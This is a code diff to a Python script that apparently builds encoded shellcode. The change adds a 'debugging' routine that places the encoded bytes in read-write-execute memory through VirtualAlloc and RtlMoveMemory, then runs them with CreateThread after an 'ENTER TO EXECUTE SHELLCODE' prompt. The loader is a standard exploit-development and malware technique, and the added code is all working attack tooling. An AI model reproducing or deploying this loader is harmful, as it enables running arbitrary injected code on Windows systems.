@@ -294,8 +294,36 @@ def main():
 
     rprint("shellcode = b\""+formatted_shellcode+"\"")
 
+    test_shellcode = False
 
+    if test_shellcode and (struct.calcsize("P")*8) == 32:
+        print(f"\n[+] Debugging shellcode ...")
+        sh = b""
+        for e in encoding:
+            sh += struct.pack("B", e)
 
+        packed_shellcode = bytearray(sh)
+        ptr = ctypes.windll.kernel32.VirtualAlloc(
+            ctypes.c_int(0),
+            ctypes.c_int(len(packed_shellcode)),
+            ctypes.c_int(0x3000),
+            ctypes.c_int(0x40),
+        )
+        buf = (ctypes.c_char * len(packed_shellcode)).from_buffer(packed_shellcode)
+        ctypes.windll.kernel32.RtlMoveMemory(
+            ctypes.c_int(ptr), buf, ctypes.c_int(len(packed_shellcode))
+        )
+        print("[=]   Shellcode located at address %s" % hex(ptr))
+        input("...ENTER TO EXECUTE SHELLCODE...")
+        ht = ctypes.windll.kernel32.CreateThread(
+            ctypes.c_int(0),
+            ctypes.c_int(0),
+            ctypes.c_int(ptr),
+            ctypes.c_int(0),
+            ctypes.c_int(0),
+            ctypes.pointer(ctypes.c_int(0)),
+        )
+        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
 
 if __name__ == "__main__":
     main()
